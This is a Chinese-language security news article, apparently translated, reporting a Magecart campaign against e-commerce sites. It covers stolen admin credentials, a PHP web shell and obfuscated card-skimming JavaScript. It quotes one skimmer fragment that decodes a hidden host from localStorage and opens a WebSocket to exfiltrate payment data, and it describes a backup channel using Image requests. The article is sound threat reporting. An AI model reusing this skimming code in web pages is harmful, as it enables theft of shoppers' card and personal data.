---
title: Magecart 攻击升级：电商平台支付信息遭高度混淆代码窃取
url: https://www.anquanke.com/post/id/306827
source: 安全客-有思想的安全新媒体
date: 2025-04-24
fetch_date: 2025-10-06T22:04:17.524219
---

# Magecart 攻击升级：电商平台支付信息遭高度混淆代码窃取

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Magecart 攻击升级：电商平台支付信息遭高度混淆代码窃取

阅读量**55858**

发布时间 : 2025-04-23 14:33:53

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/new-magecart-attack-with-malicious-javascript/>

译文仅供参考，具体内容表达以及含义原文为准。

一种复杂的 Magecart 攻击活动已被发现，其目标指向电子商务平台，攻击者使用经过高度混淆的 JavaScript 代码来获取敏感的支付信息。

这一最新的 Magecart 数据窃取攻击变体展现出了先进的技术，既能在结账过程中无缝获取信用卡详细信息，又能有效躲避检测。

被注入到受攻击的电子商务网站中的恶意代码在后台悄然运行，在毫无防备的客户与攻击者的命令控制服务器之间建立起了一座无形的桥梁。

此次攻击遵循多阶段入侵模式，一开始是未经授权访问网站的后端系统。

根据调查结果，攻击者最初是通过盗取管理员凭证来实施攻击的，这些凭证往往是通过部署在受害者系统上的信息窃取恶意软件获得的。

这些凭证为攻击者提供了启动攻击序列所需的特权访问权限，使他们能够绕过标准的安全措施，并在目标基础设施中站稳脚跟。

Yarix 的研究人员在对受攻击的电子商务平台进行取证调查时发现了这一特定类型的 Magecart 攻击。

他们的分析显示，一旦攻击者获得了管理员访问权限，他们会迅速上传一个定制的 PHP 网页后门程序，以保持持久访问权限，这样即使最初的入侵被发现，他们也能继续控制服务器。

被发现的这个网页后门在结构上与开源的 P.A.S. Fork v. 1.4 工具相似，但包含了针对此次攻击活动的特定自定义修改内容。

这些攻击的影响不仅仅局限于经济损失，还会对受影响的商家造成严重的声誉损害，并削弱消费者的信任。

被盗取的数据通常包括完整的信用卡信息（卡号、有效期、安全码）、个人信息（姓名、地址、电子邮件），而且往往还包括配送信息 —— 基本上为攻击者提供了进行欺诈性交易或身份盗窃所需的一切信息。

攻击的进展分为四个不同的阶段：首先利用窃取的凭证进行后端访问，然后安装网页后门程序以实现持续控制，接着通过注入混淆代码来毒害数据库，最后进入信用卡信息窃取阶段，在此阶段，客户的支付信息会被获取并泄露出去。

这种有条不紊的攻击方式展示了这些威胁行为者所采用的复杂策略。

****JavaScript 混淆与数据泄露技术****

恶意的 JavaScript 代码采用了复杂的混淆技术来躲避检测。原始代码看起来就像是一堆难以理解的十六进制值、变量赋值和函数调用的杂乱组合，而且没有缩进格式。

一个名为 “chameleon” 的关键函数是混淆策略的核心，它在执行过程中会动态地重新定义自身，并与立即调用函数表达式（IIFE）协同工作，进一步增加了代码分析的难度。

createWebSocket=(randomString=genRandomString())=>{

if(Mp2mK1sl\_Socket!==![] || localStorage[‘getItem’](‘XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf’)===null)

return![];

Mp2mK1sl\_Socket=new WebSocket(‘wss://’+JSON[‘parse’](localStorage[‘getItem’](‘XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf’))[‘map’](function(\_Oxe38f46) {

return String[‘fromCharCode’](\_Oxe38f46);

})[‘join’](”)+’?token=’+randomString)}

数据泄露机制采用了两种不同的渠道来确保数据成功被盗取。

主要方法是利用 WebSocket 与攻击者控制的服务器进行实时通信，而次要技术则是利用 Image 对象创建包含已编码信用卡数据的不可见请求。

这种创新的双通道方法增加了攻击者成功提取数据的机会，即使网络监控系统可能检测并阻止了其中一种数据泄露方法，他们仍有可能通过另一种方法得逞。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/new-magecart-attack-with-malicious-javascript/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306827](/post/id/306827)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/new-magecart-attack-with-malicious-javascript/)

如若转载,请注明出处： <https://cybersecuritynews.com/new-magecart-attack-with-malicious-javascript/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**10赞

收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p0.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)